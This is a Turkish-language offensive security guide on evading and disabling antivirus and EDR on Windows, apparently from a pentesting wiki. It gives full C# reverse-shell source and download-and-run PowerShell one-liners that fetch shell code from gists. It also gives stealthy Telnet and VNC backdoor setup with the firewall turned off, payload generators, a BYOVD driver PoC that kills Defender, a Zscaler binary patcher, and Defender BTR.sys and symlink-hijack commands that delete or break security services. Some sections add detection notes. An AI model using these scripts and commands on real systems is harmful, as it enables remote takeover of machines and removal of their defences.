Windows10'a kadar tüm Windows sürümleri, (administrator olarak) yükleyebileceğiniz bir **Telnet server** ile geliyordu. Şunu çalıştırarak:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sistem başlatıldığında **başlatılmasını** sağlayın ve şimdi **çalıştırın**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnet portunu değiştir (stealth) ve firewall'ı devre dışı bırak:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup değil, bin downloads dosyalarını istiyorsunuz)

**HOST'TA**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanına bir parola belirleyin
- _View-Only Password_ alanına bir parola belirleyin

Ardından, _**winvnc.exe**_ binary dosyasını ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Ters bağlantı**

**Attacker**, ters bir **VNC connection** yakalamaya **hazır** olması için kendi **host**'unda `vncviewer.exe -listen 5900` binary dosyasını **çalıştırmalıdır**. Ardından, **victim** içinde: winvnc daemon'ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Stealth'i korumak için bazı şeyleri yapmamalısınız

- Zaten çalışıyorsa `winvnc`'i başlatmayın; aksi hâlde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- `UltraVNC.ini` aynı dizinde değilken `winvnc`'i başlatmayın; aksi hâlde [config window](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` komutunu çalıştırmayın; aksi hâlde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT içinde:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Şimdi `msfconsole -r file.rc` ile **lister’ı başlatın** ve **xml payload’ı** şu komutla **çalıştırın**:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Mevcut Defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell’imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Şununla kullanın:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# derleyicisi kullanarak

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için Python kullanma örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Kendi Güvenlik Açığı Bulunan Sürücünüzü Getirin (BYOVD) – AV/EDR’yi Kernel Alanından Devre Dışı Bırakma

Storm-2603, ransomware bırakmadan önce endpoint korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol yardımcı programından yararlandı. Araç, **kendi güvenlik açığı bulunan ama *imzalı* sürücüsünü** getiriyor ve bunu, Protected-Process-Light (PPL) AV hizmetlerinin bile engelleyemediği ayrıcalıklı kernel işlemlerini gerçekleştirmek için kötüye kullanıyor.<sup>[[12]](#references)</sup>

Önemli noktalar
1. **İmzalı sürücü**: Diske bırakılan dosya `ServiceMouse.sys` olsa da ikili dosya, Antiy Labs’ın “System In-Depth Analysis Toolkit” aracındaki yasal olarak imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığından, Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Hizmet kurulumu**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   İlk satır driver'ı bir **kernel service** olarak kaydeder, ikinci satır ise onu başlatarak `\\.\ServiceMouse` yolunu user land'den erişilebilir hâle getirir.
3. **Driver'ın sunduğu IOCTL'ler**
   | IOCTL code | Yetenek                                |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID'sine göre herhangi bir işlemi sonlandırma (Defender/EDR servislerini sonlandırmak için kullanılır) |
   | `0x990000D0` | Diskteki herhangi bir dosyayı silme |
   | `0x990001D0` | Driver'ı unload etme ve service'i kaldırma |

   Minimal C PoC:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Neden işe yarıyor**: BYOVD, kullanıcı modu korumalarını tamamen atlar; kernel'de çalışan kod, PPL/PP, ELAM veya diğer hardening özelliklerinden bağımsız olarak *korumalı* süreçleri açabilir, sonlandırabilir ya da kernel nesnelerine müdahale edebilir.

Tespit / Azaltma
• Windows'un `AToolsKrnl64.sys` dosyasını yüklemeyi reddetmesi için Microsoft’un güvenlik açığı bulunan sürücü engelleme listesini (`HVCI`, `Smart App Control`) etkinleştirin.
• Yeni *kernel* servislerinin oluşturulmasını izleyin ve bir sürücü world-writable bir dizinden yüklendiğinde veya allow-list'te bulunmadığında uyarı verin.
• Özel aygıt nesnelerine yönelik kullanıcı modu tanıtıcılarını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Diskteki İkili Dosyaları Yamayarak Zscaler Client Connector Posture Kontrollerini Atlatma

Zscaler’ın **Client Connector**'ı cihaz posture kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye güvenir. İki zayıf tasarım tercihi, tam bir bypass'ı mümkün kılar:

1. Posture değerlendirmesi **tamamen istemci tarafında** gerçekleşir (sunucuya bir boolean gönderilir).
2. Dahili RPC endpoint'leri yalnızca bağlanan executable'ın **Zscaler tarafından imzalandığını** doğrular (`WinVerifyTrust` aracılığıyla).<sup>[[11]](#references)</sup>

**Diskteki dört imzalı ikili dosya yamalanarak** her iki mekanizma da etkisiz hâle getirilebilir:

| İkili dosya | Yamalanan özgün mantık | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece tüm kontroller uyumlu olur |
| `ZSAService.exe` | `WinVerifyTrust`'e dolaylı çağrı | NOP-ed ⇒ herhangi bir süreç (imzasız olanlar dâhil) RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tüneldeki bütünlük kontrolleri | Kısa devre edilir |

Minimal patcher alıntısı:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Orijinal dosyaları değiştirdikten ve servis yığınını yeniden başlattıktan sonra:

* **Tüm** posture kontrolleri **yeşil/uyumlu** görünür.
* İmzasız veya değiştirilmiş ikili dosyalar, adlandırılmış pipe RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş ana makine, Zscaler politikalarında tanımlanan iç ağa kısıtlamasız erişim kazanır.

Bu vaka çalışması, tamamen istemci tarafındaki güven kararlarının ve basit imza kontrollerinin birkaç byte yamasıyla nasıl aşılabileceğini gösteriyor.

## Microsoft Defender `BTR.sys` güvenilen işlevselliğinin kötüye kullanılması

Defender'ın **Boot-Time Removal** sürücüsü, klasik BYOVD'ye yararlı bir karşı örnektir. `BTR.sys`, bellek bozulması hatası ve IOCTL arayüzü bulunmayan, Microsoft tarafından imzalanmış meşru bir remediation bileşenidir; yönetici erişimi ve `SeLoadDriverPrivilege` elde edildikten sonra bir operatör, bunun yerine özel remediation işlemini taklit ederek amaçlanan Ring-0 dosya/kayıt defteri işlemlerini gerçekleştirebilir. Bu, **ilk erişim veya ayrıcalık yükseltme değil, ihlal sonrası AV/EDR etkisizleştirme primitive'idir**. Sürücü, dikkat çeken üçüncü taraf bir sürücüyü içe aktarmak yerine hedefin kendi `MpEngine.dll` dosyasındaki `BOOTTIMETOOL` kaynağından çıkarılabilir.<sup>[[36]](#references)</sup>

### Tek kullanımlık sürücünün hazırlanması

Defender normalde kaynağı rastgele bir `[a-z]{8}.sys` dosyası olarak bırakır ve benzer adlı bir kernel servisi kaydeder. `DriverEntry`, servisin `Args` değerini okur, başvurulan NTFS ADS'yi açar, eylem listesinin şifresini çözüp doğrular, geri bildirim yazar ve başarılı yürütmenin ardından `0xC0000056` (`STATUS_DELETE_PENDING`) döndürür; böylece sürücü bellekte kalmak yerine unload edilir. Taklit edilmiş bir servis şu karakteristik değerlere sahiptir.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` stream'i, RC4 ile şifrelenmiş tek bir blob içerir. Analiz edilen build'ler sabit, 256 baytlık bir anahtarı yeniden kullandığından şifreleme bir yetkilendirme sınırı değildir. Geçerli bir plaintext; 24 baytlık global header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC ve payload'dan türetilen bir transaction ID), ardından null ile sonlandırılmış bir UTF-16 feedback path ve istenen sayıda öğe içerir. Her öğe, 16 baytlık bir header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) ile başlar ve action'a özgü verilerle devam eder; bu veriler **tam olarak dört NUL baytıyla** sonlanır. Her header/veri bölgesi CRC-32 polinomu `0xEDB88320`, başlangıç durumu `0xFFFFFFFF` ve **son XOR olmadan** (`~CRC32`) bağımsız olarak kontrol edilir; CRC durumu her bölge için sıfırlanır.<sup>[[36]](#references)[[37]](#references)</sup>

Kabul edilen action ID'leri aşağıdaki kernel primitive'lerini sunar.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Öğe verisi | Sonuç |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Kilitli dosyalar dahil bir dosyayı siler |
| 2 | `[UTF-16 path]` | Boş bir dizini kaldırır |
| 3 | `[Flags][source][destination]` | Bir dosyayı saldırganın seçtiği korumalı bir path'e taşır; boş bir destination silme anlamına gelir |
| 4 | `[Flags][key path]` | Bir registry key'i özyinelemeli olarak siler |
| 5 | `[Flags][key path + "\\" + value]` | Bir registry value'yu siler |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Bir registry value oluşturur/günceller ve eksik key path'leri oluşturur |

5 ve 6 numaralı action'larda, wire format'taki key/value ayıracı **art arda gelen iki backslash'tir**; standart biçimde yazılmış bir path doğru şekilde bölünmez. Feedback file, büyük ölçüde isteği yansıtır; ancak her öğenin ilk dört veri baytı, öğenin sonuç `NTSTATUS` değerine dönüşür. Başlangıçta flags alanı olmayan 1 ve 2 numaralı action'larda BTR, bu status'a yer açmak için path'i ayrılmış son dört bayta kaydırır.<sup>[[36]](#references)</sup>

### `BTR_CLI` iş akışı ve erken önyükleme aralığı

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI), zincirin tamamını uygular: `BTR.sys` dosyasını yerel Defender'dan çıkarır, `<random>.sys:changelist` ve bir feedback stream oluşturur, zincirlenmiş action'ları serileştirir/checksum'lar/şifreler, service registry key'ini doğrudan oluşturur ve ardından `-trigger now` için `NtLoadDriver` çağrısı yapar ya da `-trigger boot` için sürücüyü system-start sürücüsü olarak bırakır. Registry'yi doğrudan hazırlamak, normal SCM `CreateServiceW` yolunu atlar; dolayısıyla service-install Event ID 7045 oluşturmaz. Boot-triggered artifact'lar daha sonra `BTR_CLI.exe -cleanup <service_name>` ile kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` kullanılamaz; çünkü BTR, storage stack ve `SystemRoot` bağlantısı hazır olmadan önce `DriverEntry` içinden dosya G/Ç işlemleri gerçekleştirir. `Start=1` ve yüksek öncelikli `Boot Bus Extender` grubu ise Phase 1'de çalışır: NTFS kullanılabilir durumdadır, ancak birçok system-start güvenlik sürücüsü ve user-mode EDR hizmeti henüz başlatılmamıştır. `WdFilter` gibi boot-start filtreleri zaten yüklenmiş olabilir; yine de BTR, bir sonraki başlangıçtan önce bunların ikili dosyalarını veya hizmet yapılandırmasını kaldırabilir ve SCM bunları başlatmadan önce hizmet yürütülebilir dosyalarını silebilir. BTR, boot-start değerlendirmesinden sonra çalıştığı ve geçerli bir Microsoft imzası taşıdığı için ELAM bu açığı kapatmaz.<sup>[[36]](#references)</sup>

Birden fazla eylem tek bir işlemde yürütülür. PoC, sabit kodlanmış `\SystemRoot\Temp\BootClean.log` için Action 1'i başa ekler: BTR bu logu oluşturur, ardından kendi silme isteğini işleyip unload olmadan önce logu kaldırır. Bu, kanıt miktarını azaltırken geri bildirimin `<random>.sys:<random>.dat` içine yerleştirilmesi sürücünün ve her iki stream'in birlikte kaldırılmasını sağlar.<sup>[[36]](#references)[[37]](#references)</sup>

### Yüksek sinyalli tespit korelasyonları

Yalnızca imzaya dayalı kurallar ve Microsoft'un savunmasız sürücü engelleme listesi, BTR'ın amaçlanan işlevlerinin kötüye kullanılmasını ele almaz. Meşru Defender soyunu gelişigüzel bir başlatıcıdan ayırırken bu davranışsal korelasyonları tercih edin.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` oluşturulması, BTR hazırlığının her zaman görülen bir özelliğidir. Aynı `.sys` dosyasına eklenmiş bir `.dat` ADS özellikle şüphelidir; çünkü meşru Defender genellikle geri bildirimi `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` altına yerleştirir.
- **System 7045 olmadan Sysmon 12/13:** `Args=...:changelist` ve `Group=Boot Bus Extender` içeren `HKLM\SYSTEM\CurrentControlSet\Services\<random>` anahtarının doğrudan oluşturulmasını, eşleşen bir SCM yükleme olayı yoksa korele edin.
- **Sysmon 6 -> 23:** Bilinen bir BTR sürücüsünün Defender dışı bir soydan yüklenmesini, ardından özellikle güvenlik ikili dosyaları için `System`/PID 4'e atfedilen dosya silme işlemleriyle korele edin.
- **Sysmon 11 -> 23:** `System`/PID 4 tarafından `\SystemRoot\Temp\BootClean.log` dosyasının hızla oluşturulup silinmesi durumunda uyarı verin.
- `SeLoadDriverPrivilege` atamasını/etkinleştirilmesini kısıtlayın ve denetleyin; `cmd.exe`, PowerShell veya bilinmeyen bir işlem tarafından güvenlik aracı sürücüsü hazırlanırken yalnızca Microsoft imzası yeterli güvence sağlamaz.

## Protected Process Light (PPL) Kötüye Kullanarak LOLBINs ile AV/EDR'ye Müdahale Etme

Protected Process Light (PPL), yalnızca eşit veya daha yüksek koruma düzeyindeki süreçlerin birbirine müdahale edebilmesini sağlayan bir imzalayan/düzey hiyerarşisi uygular. Saldırgan bakış açısından, PPL etkin bir ikili dosyayı meşru şekilde başlatabilir ve argümanlarını denetleyebilirseniz, zararsız işlevleri (ör. loglama) AV/EDR tarafından kullanılan korumalı dizinlere karşı kısıtlı, PPL destekli bir yazma primitive'ine dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir süreci PPL olarak çalıştıran koşullar
- Hedef EXE (ve yüklenen tüm DLL'ler) PPL destekli bir EKU ile imzalanmış olmalıdır.
- Süreç, şu flag'lerle CreateProcess kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- İkili dosyanın imzalayanıyla eşleşen uyumlu bir koruma düzeyi istenmelidir (ör. anti-malware imzalayanları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows imzalayanları için `PROTECTION_LEVEL_WINDOWS`). Yanlış düzeyler oluşturma işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS korumasına ilişkin daha kapsamlı bir giriş için ayrıca şuraya bakın:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Başlatıcı araçları
- Açık kaynaklı yardımcı: CreateProcessAsPPL (koruma düzeyini seçer ve argümanları hedef EXE'ye iletir):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Kullanım kalıbı:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- İmzalı sistem binary'si `C:\Windows\System32\ClipUp.exe` kendi sürecini başlatır ve çağıranın belirttiği bir yola log file yazmak için parametre kabul eder.
- PPL process olarak başlatıldığında file write, PPL korumasıyla gerçekleşir.
- ClipUp, boşluk içeren yolları ayrıştıramaz; normalde korunan konumları belirtmek için 8.3 kısa yolları kullanın.

8.3 kısa yol yardımcıları
- Kısa adları listeleyin: Her üst dizinde `dir /x` çalıştırın.
- cmd'de kısa yol oluşturun: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Kötüye kullanım zinciri (soyut)
1) Bir başlatıcı (ör. CreateProcessAsPPL) kullanarak PPL destekli LOLBIN'i (ClipUp), `CREATE_PROTECTED_PROCESS` ile başlatın.
2) Korunan bir AV dizininde (ör. Defender Platform) file creation gerçekleştirmek için ClipUp log-path argümanını iletin. Gerekirse 8.3 kısa adlarını kullanın.
3) Hedef binary normalde AV çalışırken açık/kilitli durumdaysa (ör. MsMpEng.exe), AV başlamadan önce açılışta yazma işlemini gerçekleştirmek için daha önce çalışması güvenilir olan bir auto-start service yükleyin. Process Monitor ile açılış sırasını doğrulayın (boot logging).
4) Yeniden başlatma sırasında PPL korumalı yazma, AV binary'lerini kilitlemeden önce gerçekleşir; hedef dosya bozulur ve AV'nin başlaması engellenir.

Örnek çağrı (güvenlik nedeniyle yollar kısaltılmış ve gizlenmiştir):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notlar ve kısıtlamalar
- ClipUp'ın yazdığı içerikleri yerleşim dışında kontrol edemezsiniz; bu primitive, hassas içerik enjeksiyonundan ziyade bozulma için uygundur.
- Bir hizmeti yüklemek/başlatmak ve yeniden başlatma penceresi için yerel admin/SYSTEM yetkisi gerekir.
- Zamanlama kritik önemdedir: hedef açık olmamalıdır; başlangıç sırasında çalıştırma, dosya kilitlerini önler.

Tespit
- Özellikle standart olmayan başlatıcılar tarafından başlatılan `ClipUp.exe` işlemlerinin, başlangıç sırasında olağandışı argümanlarla oluşturulması.
- Şüpheli ikili dosyaları otomatik başlatacak şekilde yapılandırılan ve sürekli olarak Defender/AV'den önce başlayan yeni hizmetler. Defender başlatma hatalarından önceki hizmet oluşturma/değişikliklerini inceleyin.
- Defender ikili dosyaları/Platform dizinleri üzerinde dosya bütünlüğü izleme; korumalı işlem bayrakları olan işlemlerin beklenmedik dosya oluşturma/değiştirme faaliyetleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan işlemleri ve AV dışı ikili dosyaların anormal PPL seviyesi kullanımını inceleyin.

Azaltma
- WDAC/Code Integrity: PPL olarak çalışabilecek imzalı ikili dosyaları ve bunların hangi üst süreçlerden başlatılabileceğini kısıtlayın; ClipUp'ın meşru bağlamlar dışında çağrılmasını engelleyin.
- Hizmet güvenliği: otomatik başlatılan hizmetlerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender kurcalama korumasının ve erken başlatma korumalarının etkin olduğundan emin olun; ikili dosya bozulmasına işaret eden başlangıç hatalarını inceleyin.
- Ortamınızla uyumluysa, güvenlik araçlarının bulunduğu birimlerde 8.3 kısa ad oluşturmayı devre dışı bırakmayı değerlendirin (iyice test edin).

## Platform Sürüm Klasörü Symlink Hijack ile Microsoft Defender'ı Kurcalama

Windows Defender, çalışacağı platformu şu dizinin altındaki alt klasörleri listeleyerek seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek sözlük sıralı sürüm dizesine sahip alt klasörü (ör. `4.18.25070.5-0`) seçer, ardından Defender hizmet işlemlerini buradan başlatır (hizmet/kayıt defteri yollarını buna göre günceller). Bu seçim, dizin symlink'leri de dahil olmak üzere dizin girdilerine güvenir. Bir yönetici, Defender'ı saldırganın yazabildiği bir yola yönlendirmek ve DLL sideloading veya hizmet kesintisi sağlamak için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Ön koşullar
- Yerel Administrator (Platform klasörü altında dizin/symlink oluşturmak için gerekir)
- Yeniden başlatma veya Defender platformunun yeniden seçilmesini tetikleme olanağı (başlangıçta hizmetin yeniden başlatılması)
- Yalnızca yerleşik araçlar gerekir (`mklink`)

Neden işe yarar
- Defender kendi klasörlerine yazılmasını engeller, ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözümlendiğini doğrulamadan sözlük sıralaması en yüksek sürümü seçer.

Adım adım (örnek)
1) Geçerli platform klasörünün yazılabilir bir kopyasını hazırlayın; örneğin `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüzü gösteren daha yüksek sürüm numaralı bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)'in yönlendirilmiş yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni process path'inin `C:\TMP\AV\` altında olduğunu ve service yapılandırmasının/registry'nin bu konumu yansıttığını gözlemlemelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender'ın uygulama dizininden yüklediği DLL'leri bırakarak/değiştirerek Defender'ın process'lerinde kod yürütün. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Bir sonraki başlatmada yapılandırılmış path'in çözümlenmemesi ve Defender'ın başlatılamaması için version-symlink'i kaldırın:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

